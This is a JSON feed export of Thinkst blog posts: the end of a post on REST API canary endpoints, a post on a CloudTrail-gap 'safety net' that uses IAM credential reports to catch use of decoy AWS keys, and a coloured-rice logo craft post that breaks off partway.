pre-wrap;\">\u00a0</span><span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">https://labs.detectify.com/2021/08/10/how-to-hack-apis-in-2021/</span></a></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Conclusion</span><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">\u00a0</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">We can leverage already existing Canarytokens and Canary HTTP services to receive and alert</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">on unauthorized REST API request attempts. With the already existing HTTP primitives teams can extend </span><span style=\"font-family: Arial; font-size: 11pt; white-space: pre-wrap;\">or embed these examples within their organization and applications to detect and alert on unauthorized </span><span style=\"font-family: Arial; font-size: 11pt; white-space: pre-wrap;\">use.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">\u00a0</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">References:</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">API Examples:</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><a href=\"https://docs.github.com/en/rest/billing#about-the-billing-api\"><span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">https://docs.github.com/en/rest/billing#about-the-billing-api</span></a></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><a href=\"https://api.nasa.gov/\"><span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">https://api.nasa.gov/</span></a></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><a href=\"https://stripe.com/docs/api\"><span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">https://stripe.com/docs/api</span></a></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><a href=\"https://docs.microsoft.com/en-us/rest/api/azure/\"><span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">https://docs.microsoft.com/en-us/rest/api/azure/</span></a></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><a href=\"https://betterprogramming.pub/the-anatomy-of-an-http-request-728a469ecba9\"><span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">https://betterprogramming.pub/the-anatomy-of-an-http-request-728a469ecba9</span></a></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><a href=\"https://labs.detectify.com/2021/08/10/how-to-hack-apis-in-2021/\"><span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">https://labs.detectify.com/2021/08/10/how-to-hack-apis-in-2021/</span></a></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><a href=\"https://nostarch.com/hacking-apis\"><span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-style: italic; vertical-align: baseline; white-space: pre-wrap;\">Hacking APIs ,Breaking Web Application Programming Interfaces</span></a>\u00a0&#8211;<span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"> by Corey Ball.</span></p>"
                }
            ],
            "wfw_commentrss": "https://blog.thinkst.com/2022/07/creating-rest-api-canary-endpoints.html/feed",
            "slash_comments": "0",
            "post-id": "22"
        },
        {
            "title": "A \u201cSafety Net\u201d for AWS Canarytokens",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "A \u201cSafety Net\u201d for AWS Canarytokens"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://blog.thinkst.com/2022/02/a-safety-net-for-aws-canarytokens.html"
                }
            ],
            "link": "https://blog.thinkst.com/2022/02/a-safety-net-for-aws-canarytokens.html",
            "comments": "https://blog.thinkst.com/2022/02/a-safety-net-for-aws-canarytokens.html#respond",
            "authors": [
                {
                    "name": "Marco Slaviero"
                }
            ],
            "author": "Marco Slaviero",
            "author_detail": {
                "name": "Marco Slaviero"
            },
            "published": "Mon, 07 Feb 2022 17:24:00 +0000",
            "published_parsed": [
                2022,
                2,
                7,
                17,
                24,
                0,
                0,
                38,
                0
            ],
            "tags": [
                {
                    "term": "Uncategorized",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://blog.thinkst.com/2022/02/07/a-safety-net-for-aws-canarytokens/",
            "guidislink": false,
            "summary": "The AWS API Key Canarytoken (paid and free) is a great way to detect attackers who have compromised your infrastructure. The full details are in a previous blogpost, but in short:\u00a0 You go to https://canarytokens.org and generate a set of valid AWS API credentials; Simply leave those in ~/.aws/config on a machine that&#8217;s important to you Done! If that machine is ever breached, the sort of attackers who keep you up at night will look for AWS API credentials, and they will try them.\u00a0 And when they do, we let you know that you\u2019ve been breached. When you receive an email/SMS/Slack message letting you know that the AWS API key that you left only on BuildServer-7 in Server-room #12 just got used to login to AWS, you know you have a problem.\u00a0 The underlying Canarytoken infrastructure relies on AWS APIs logging their own execution to CloudTrail. This lets us identify: which IP made the call; which API was executed (including both the service name and function); plus other details about the client executing the call. The effectiveness of the AWS API Key Canarytoken shouldn\u2019t be underestimated. Attackers have to try them; they could be the keys to the victim\u2019s kingdom. [&#8230;]",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "The AWS API Key Canarytoken (paid and free) is a great way to detect attackers who have compromised your infrastructure. The full details are in a previous blogpost, but in short:\u00a0 You go to https://canarytokens.org and generate a set of valid AWS API credentials; Simply leave those in ~/.aws/config on a machine that&#8217;s important to you Done! If that machine is ever breached, the sort of attackers who keep you up at night will look for AWS API credentials, and they will try them.\u00a0 And when they do, we let you know that you\u2019ve been breached. When you receive an email/SMS/Slack message letting you know that the AWS API key that you left only on BuildServer-7 in Server-room #12 just got used to login to AWS, you know you have a problem.\u00a0 The underlying Canarytoken infrastructure relies on AWS APIs logging their own execution to CloudTrail. This lets us identify: which IP made the call; which API was executed (including both the service name and function); plus other details about the client executing the call. The effectiveness of the AWS API Key Canarytoken shouldn\u2019t be underestimated. Attackers have to try them; they could be the keys to the victim\u2019s kingdom. [&#8230;]"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://blog.thinkst.com/feed",
                    "value": "<p><span style=\"font-family: Arial; font-size: 14.6667px; white-space: pre-wrap;\">The AWS API Key Canarytoken (paid and free) is a great way to detect attackers who have compromised your infrastructure. The full details are in a <a href=\"https://blog.thinkst.com/2017/09/canarytokens-new-member-aws-api-key.html\">previous blogpost</a>, but in short:\u00a0</span></p>\n</p>\n<ol style=\"text-align: left;\">\n<li><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">You go to <a href=\"https://canarytokens.org\">https://canarytokens.org</a> and generate a set of valid AWS API credentials;</span></span></li>\n<li><span style=\"font-size: 14.6667px; white-space: pre-wrap;\"><span style=\"font-family: Arial;\">Simply leave those in </span><span style=\"font-family: courier;\">~/.aws/config</span><span style=\"font-family: Arial;\"> on a machine that&#8217;s important to you</span></span></li>\n<li><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">Done!</span></span></li>\n</ol>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">If that machine is ever breached, the sort of attackers who keep you up at night <i>will</i> look for AWS API credentials, and they <i>will</i> try them.\u00a0</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">And when they do, we let you know that you\u2019ve been breached.</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">When you receive an email/SMS/Slack message letting you know that the AWS API key that you left only on BuildServer-7 in Server-room #12 just got used to login to AWS, you know you have a problem.\u00a0</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">The underlying Canarytoken infrastructure relies on AWS APIs logging their own execution to CloudTrail. This lets us identify: which IP made the call; which API was executed (including both the service name and function); plus other details about the client executing the call.</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">The effectiveness of the AWS API Key Canarytoken shouldn\u2019t be underestimated. Attackers <i>have</i> to try them; they could be the keys to the victim\u2019s kingdom. If they don\u2019t try the keys, they might be missing a golden opportunity. AWS API Keys are about the juiciest bait you can dangle in front of adversaries.</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">For defenders, the keys we supply are simple and entirely safe. They\u2019re not tied to anything owned by the defender (the infrastructure sits completely at Thinkst), the keys have no permissions so they can\u2019t be used to do anything, and no agents or software needs to be installed. You simply drop a text file, and wait to be notified if anything happens.</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">Between Canarytokens.org and our commercial Canarytokens offering, thousands and thousands of\u00a0 machines worldwide have AWS API Canarytokens lying in wait for attackers.</span></span></p>\n<h2 style=\"text-align: left;\"><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">Can AWS Canarytokens be detected?</span></span></h2>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">This introduces a new goal for the super stealthy attacker. If they find an AWS API key on a server, can they tell if it&#8217;s a Canarytoken (or if it is a legitimate key?). Our view is that this only matters if an attacker can determine this <i>without triggering the token</i>. In other words, the Canarytoken fails if attackers can come across API credentials, and perform some test that returns whether or not the credentials are Canarytokens but defenders are never notified of the test.\u00a0</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">The key (heh) to making this happen as an attacker, would be to find AWS APIs that don\u2019t log their execution, and also reveal information about the calling API Key to the caller.</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">For our purposes, there are four classes of error responses from AWS APIs:</span></span></p>\n</p>\n<ol style=\"text-align: left;\">\n<li><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">Logs to CloudTrail, reveals no information about the API key</span></span></li>\n<li><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">Logs to CloudTrail, does reveal account details from the API key</span></span></li>\n<li><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">No CloudTrail logs, reveals no information about the API key</span></span></li>\n<li><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">No CloudTrail logs, does reveal account details from the API key</span></span></li>\n</ol>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">As defenders,\u00a0 4 is the worst case. If an API fulfills number 4, then Canarytokens can be detected. 3 is not great either, but softens the impact to \u201cattackers can determine where credentials are valid, but not whether they\u2019re Canarytokens\u201d.</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">The next bit may surprise those who\u2019ve never worked with it: the AWS API is a mishmash of response codes, error code, error strings, exception names, and data formatting. It is anything but consistent.</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">In the past, it\u2019s been the case that a tiny subset of API errors did fulfill the constraints for class 4. The folks at Rhino Security <a href=\"https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/\">blogged about this</a> (RIP Spencer). While AWS (very slowly) does seem to react to reports on APIs which don\u2019t show up in CloudTrail, that\u2019s not sufficient. As it stands, we\u2019re not aware of class 4 error responses currently in the AWS API, but at the rate at which new APIs are added, that\u2019s little solace for thinking about the future.</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">There are certainly class 3 error responses in the current AWS API if you go looking hard enough.</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">In summary, the AWS API has a small number of endpoints which don\u2019t log their own usage to CloudTrail, creating a blindspot for defenders. What do we do in those instances?</span></span></p>\n<h2 style=\"text-align: left;\"><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">IAM Credential Reports</span></span></h2>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\"><a href=\"https://twitter.com/0xdabbad00\">Scott Piper</a> pointed out that Amazon actually does provide a backup mechanism for identifying credential usage. The IAM service lets you <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_getting-report.html\">generate and download</a> a report for all your credentials. This is a CSV file where each row belongs to an IAM user, and some of the columns identify when an access key was used, and on which AWS service it was used.</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">With the credential report, there are no longer class 3 or 4 error responses in a practical sense; we can also check the credential report to see if an API key was used, so no longer need to just rely on CloudTrail.</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">The report has three main drawbacks.</span></span></p>\n</p>\n<ol style=\"text-align: left;\">\n<li><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">The report can only be generated once every four hours, so at worst there\u2019s a four hour delay between credentials being used, and you seeing the notifications.\u00a0</span></span></li>\n<li><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">The fidelity of the reports is low; you only can tell the last time the key was used and on which service (e.g. ec2, iam, sts, etc). You can\u2019t tell which function was called.\u00a0</span></span></li>\n<li><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">You don\u2019t get any client information, including IP addresses or client versions.</span></span></li>\n</ol>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">However in spite of these drawbacks, it\u2019s a huge step up in terms of reliability of this token type. Attackers don\u2019t have places to sneakily test their API keys. This safety net means that every key usage will be detected and alerted on, albeit sometimes with lower fidelity artifacts.\u00a0</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">Even if you didn\u2019t know the attackers IP Address, would it be worth knowing that the key that you placed on \\\\code-sign-22 was used to login to AWS this morning? Absolutely!</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">In fact, if a key is only used on what was previously a class 3 or 4 API, that\u2019s even <i>more</i> of a signal since it implies the attacker is actively trying to avoid detection.</span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">So we built an AWS safety net, to help us catch attackers who actively try to avoid detection.</span></span></p>\n<h2 style=\"text-align: left;\"><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">Building an AWS Safety Net</span></span></h2>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">The architecture is very straight forward. An AWS Lambda function fires on a periodic schedule. It pulls in the credential report from IAM, iterates over all the rows, and determines whether the last recorded use of the key happened more recently than the CloudTrail logs show. If so, the Safety Net kicks in, and sends out the alert:</span></span></p>\n<p><span style=\"border: none; display: inline-block; height: 575px; overflow: hidden; width: 624px;\"><img height=\"575\" src=\"https://lh4.googleusercontent.com/4WfsrNwpDfcqHUY4o6o_zVyfKGwSKJLQoEgem9yfUUQJrJvD4-dZcvzbRBDbRa0uwZq9jE6tHiro9Zg2Ewsb89VzT0yasRsXBDas1Z9mka1nMr2yBavyie9I1h4khjTuYHmzkOKw\" style=\"margin-left: 0; margin-top: 0;\" width=\"624\" /></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">Browsing to the history page for the incident, you see an annotation telling you that the Safety Net picked up this usage:</span></span></p>\n<p><span id=\"docs-internal-guid-ae8882ad-7fff-72c1-b102-12c64ceef453\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 176px; overflow: hidden; width: 624px;\"><img height=\"176\" src=\"https://lh6.googleusercontent.com/HIHA05W6VEXcOACtyfVq3PRcRylI80saQAp1ALNcbx4seyqiieUHWSk0nVYyFjG_X34B4l3E7Hq6FzF7m5XkDGH06qzcVOl_9SH5UCW3svPn4LeodutvjVIHuTKdeW2okDs9Xsu-\" style=\"margin-left: 0; margin-top: 0;\" width=\"624\" /></span></span></span></p>\n<p><span id=\"docs-internal-guid-8841c56c-7fff-4609-f31c-e78c0b22a864\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"></span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">The Safety Net was deployed to our commercial customers a little while back thanks to Jason, and we\u2019ve recently rolled it out to the free users on Canarytokens.org too.</span></span></p>\n<h2 style=\"text-align: left;\"><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">Wrapping Up</span></span></h2>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">AWS API logging previously left a small but significant gap that potentially gave attackers a way to use Canarytoken API keys without triggering alarms. With the deployment of the Safety Net, this gap has been plugged.</span></span></p>\n<div></div>"
                }
            ],
            "wfw_commentrss": "https://blog.thinkst.com/2022/02/a-safety-net-for-aws-canarytokens.html/feed",
            "slash_comments": "0",
            "post-id": "24"
        },
        {
            "title": "Canary Rice Toss",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Canary Rice Toss"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://blog.thinkst.com/2022/01/canary-rice-toss.html"
                }
            ],
            "link": "https://blog.thinkst.com/2022/01/canary-rice-toss.html",
            "comments": "https://blog.thinkst.com/2022/01/canary-rice-toss.html#respond",
            "authors": [
                {
                    "name": "anna"
                }
            ],
            "author": "anna",
            "author_detail": {
                "name": "anna"
            },
            "published": "Thu, 20 Jan 2022 12:49:00 +0000",
            "published_parsed": [
                2022,
                1,
                20,
                12,
                49,
                0,
                3,
                20,
                0
            ],
            "tags": [
                {
                    "term": "Uncategorized",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://blog.thinkst.com/2022/01/20/canary-rice-toss/",
            "guidislink": false,
            "summary": "To see a World in a Grain of\u00a0Sand\u00a0Rice &#8211; William Blake mh If you are on TikTok (or a fan of talk shows) at the moment then, no doubt, your feed has included coloured rice being tossed in the air in the form of song lyrics, beloved cartoon characters, and even famous faces. @mr.riceguy Whilst coloured rice is not a new thing (for most preschool teachers, it is a cheap and effective way to keep kids entertained), a bunch of TikTok-ers have made a living off turning this simple play-thing into a full-on career. And, obviously, when a current trend is well-suited to our logo, we have to give it a go. Here\u2019s how we got there: What we used Rice Our whole logo only needed 500g, however, we needed a few attempts to get it right and ended up using about 3kg. White rice is reusable, a jumble of multi-coloured rice, not so much\u2026 Food colouring Vinegar 1 teaspoon per cup of rice Large (relatively stiff) rice tossing surface We used a shelf from our cupboard\u2026 How we did it We started by colouring the rice We mixed 4 cups of rice with 4 teaspoons of vinegar and added [&#8230;]",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "To see a World in a Grain of\u00a0Sand\u00a0Rice &#8211; William Blake mh If you are on TikTok (or a fan of talk shows) at the moment then, no doubt, your feed has included coloured rice being tossed in the air in the form of song lyrics, beloved cartoon characters, and even famous faces. @mr.riceguy Whilst coloured rice is not a new thing (for most preschool teachers, it is a cheap and effective way to keep kids entertained), a bunch of TikTok-ers have made a living off turning this simple play-thing into a full-on career. And, obviously, when a current trend is well-suited to our logo, we have to give it a go. Here\u2019s how we got there: What we used Rice Our whole logo only needed 500g, however, we needed a few attempts to get it right and ended up using about 3kg. White rice is reusable, a jumble of multi-coloured rice, not so much\u2026 Food colouring Vinegar 1 teaspoon per cup of rice Large (relatively stiff) rice tossing surface We used a shelf from our cupboard\u2026 How we did it We started by colouring the rice We mixed 4 cups of rice with 4 teaspoons of vinegar and added [&#8230;]"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://blog.thinkst.com/feed",
                    "value": "<blockquote><p>To see a World in a Grain of\u00a0<span>Sand</span>\u00a0Rice</p>\n<p>&#8211; <span style=\"text-decoration: line-through;\">William Blake</span> mh</p></blockquote>\n<p>If you are on TikTok (or a fan of <a href=\"https://www.youtube.com/watch?v=HODoJvkZjKw\" rel=\"nofollow noopener\" target=\"_blank\">talk shows</a>) at the moment then, no doubt, your feed has included coloured rice being tossed in the air in the form of song lyrics, beloved cartoon characters, and even famous faces.</p>\n<table align=\"center\" cellpadding=\"0\" cellspacing=\"0\" class=\"tr-caption-container\" style=\"margin-left: auto; margin-right: auto;\">\n<tbody>\n<tr>\n<td style=\"text-align: center;\"><span style=\"margin-left: auto; margin-right: auto;\"><a href=\"https://blog.thinkst.com/goog_1354272222\"><img border=\"0\" height=\"320\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEituG7V5hmhcZPIjmiSZohVBHDDSVOuWFR5MRbWVHVfmb5qnxJ30c5U8v3uHbYq67r40ZvT0fwRdPFJ4JYtEG0iv5_gXDQWzcYkh_BDBzfHxlS2uQGAs5Bmc0lEXIVxyPum0gnL-LU-UZujs5xtwkuATIa-qKJ7tdfxhB0POM3LiBgj1Iz0e1MEIDrc=s320\" width=\"179\" /></a></span></td>\n</tr>\n<tr>\n<td class=\"tr-caption\" style=\"text-align: center;\"><a href=\"http://@mr.riceguy\">@mr.riceguy</a></td>\n</tr>\n</tbody>\n</table>\n<p>Whilst coloured rice is not a new thing (for most preschool teachers, it is a cheap and effective way to keep kids entertained), a bunch of TikTok-ers have made a living off turning this simple play-thing into a full-on career. And, obviously, when a current trend is well-suited to our logo, we have to give it a go. Here\u2019s how we got there:</p>\n<h3 style=\"text-align: left;\">What we used</h3>\n<ul style=\"text-align: left;\">\n<li>Rice\n<ul>\n<li>Our whole logo only needed 500g, however, we needed a few attempts to get it right and ended up using about 3kg. White rice is reusable, a jumble of multi-coloured rice, not so much\u2026</li>\n</ul>\n</li>\n<li>Food colouring</li>\n<li>Vinegar\n<ul>\n<li>1 teaspoon per cup of rice</li>\n</ul>\n</li>\n<li>Large (relatively stiff) rice tossing surface\n<ul>\n<li>We used a shelf from our cupboard\u2026</li>\n</ul>\n</li>\n</ul>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEifzlYpsP7D4LeyG_-KnajY1eMxFd3wUz0O20ufT6d2TLQtJD0dw3EPINJp3dz4Zy3lTborfqT38VoUBA686U57QAzECM4OtM93him33PPevJyYdhZ8H1OYK2V954KfHsxOqnrFzVM-4dwhQiRzPhpXdJ5vTj3UgFPDtrqaEEeO95Q-u4aI1wSVPHJA=s731\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"320\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEifzlYpsP7D4LeyG_-KnajY1eMxFd3wUz0O20ufT6d2TLQtJD0dw3EPINJp3dz4Zy3lTborfqT38VoUBA686U57QAzECM4OtM93him33PPevJyYdhZ8H1OYK2V954KfHsxOqnrFzVM-4dwhQiRzPhpXdJ5vTj3UgFPDtrqaEEeO95Q-u4aI1wSVPHJA=s320\" width=\"179\" /></a></div>\n<div></div>\n<p style=\"text-align: left;\">\n<h3 style=\"text-align: left;\">How we did it</h3>\n<ul style=\"text-align: left;\">\n<li>We started by colouring the rice\n<ul>\n<li>We mixed 4 cups of rice with 4 teaspoons of vinegar and added food colouring until we got to the colour we wanted. The vinegar helps the colour spread evenly and get absorbed by the rice, so that, when playing with it, the colour doesn\u2019t stain your fingers.</li>\n</ul>\n</li>\n</ul>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEhOJeuswrcH1rzjJKeUMac03O1Dn0F_llrk2m2ZP1L2ywNlfHWVlkBgcgBAdoAyIsr3-oSKKjUMyJxmI8bzmchlIa1cI2cEPUS4m9BxLhTf2py7GI_xs9LbCXrRoQQ9gFQAfPjfQNTlLg6sdPKgAX8csraD1AkPhAtbUMNE66mkmTwVT1XhZ0k5xDmU=s320\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"180\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEhOJeuswrcH1rzjJKeUMac03O1Dn0F_llrk2m2ZP1L2ywNlfHWVlkBgcgBAdoAyIsr3-oSKKjUMyJxmI8bzmchlIa1cI2cEPUS4m9BxLhTf2py7GI_xs9LbCXrRoQQ9gFQAfPjfQNTlLg6sdPKgAX8csraD1AkPhAtbUMNE66mkmTwVT1XhZ0k5xDmU\" width=\"320\" /></a></div>\n<p style=\"text-align: left;\">\n<ul style=\"text-align: left;\">\n<li>Once mixed well (and to your colour-liking), we then dried the rice on trays lined with paper towel. The thinner the layer, the quicker it dries. Ours took about 2 hours.</li>\n</ul>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEiZXWWSGRIEqM0Gp_Hr8IC9sW_1CsK0GaMqpB635QrR4g6420BaAYnoVyF2qDXwdhk7_a_IbhkY5YQsDgFEAJmU9HBwmH7QwXA9UyGAxFPJu2O9mdWI8RWZg4r1wzZWFYxgUkXgWsLQsosTI4_gzJWC5uw21sxg7mnKum0CF51A862xCd4bOJ1SkEi9=s1280\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"240\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEiZXWWSGRIEqM0Gp_Hr8IC9sW_1CsK0GaMqpB635QrR4g6420BaAYnoVyF2qDXwdhk7_a_IbhkY5YQsDgFEAJmU9HBwmH7QwXA9UyGAxFPJu2O9mdWI8RWZg4r1wzZWFYxgUkXgWsLQsosTI4_gzJWC5uw21sxg7mnKum0CF51A862xCd4bOJ1SkEi9=s320\" width=\"320\" /></a></div>\n<p style=\"text-align: left;\">\n<ul style=\"text-align: left;\">\n<li>We scaled and sketched our logo onto the board\n<ul>\n<li>If we had had a projector, this would have been a much quicker + easier process, but alas.</li>\n<li>Note that the image that you sketch out on the board will be reversed when tossed into the air. We drew the logo on in the correct orientation and then simply flipped the footage in editing</li>\n</ul>\n</li>\n</ul>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEh7XDjKkc_A1Em5CX2mMPuNXE3LGrrTOibycdxhmYoLNZn_fTPjDhDSmQcgyFRbL_2REQ7UKpGTnc9Rz-qdZIw8Zf0_0D_L0NvsPvuaFMFEdnDC4lnWF8mCOhIcMG1sgi8u1heRBsZwd7Q3f_2tz42wsAqlNkg4GN2rq_fXBzxE26bfYmoFc3uXdsyb=s1280\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"296\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEh7XDjKkc_A1Em5CX2mMPuNXE3LGrrTOibycdxhmYoLNZn_fTPjDhDSmQcgyFRbL_2REQ7UKpGTnc9Rz-qdZIw8Zf0_0D_L0NvsPvuaFMFEdnDC4lnWF8mCOhIcMG1sgi8u1heRBsZwd7Q3f_2tz42wsAqlNkg4GN2rq_fXBzxE26bfYmoFc3uXdsyb=s320\" width=\"320\" /></a></div>\n<ul style=\"text-align: left;\">\n<li>Practice makes perfect\n<ul>\n<li>We had a few attempts with random shapes, just using white rice, so that we could practise the flip motion (and then could reuse the white rice)</li>\n<li>We found the trick was to not raise the board too aggressively, but drop it as quickly as possible</li>\n</ul>\n</li>\n</ul>\n<table align=\"center\" cellpadding=\"0\" cellspacing=\"0\" class=\"tr-caption-container\" style=\"margin-left: auto; margin-right: auto;\">\n<tbody>\n<tr>\n<td style=\"text-align: center;\"><a 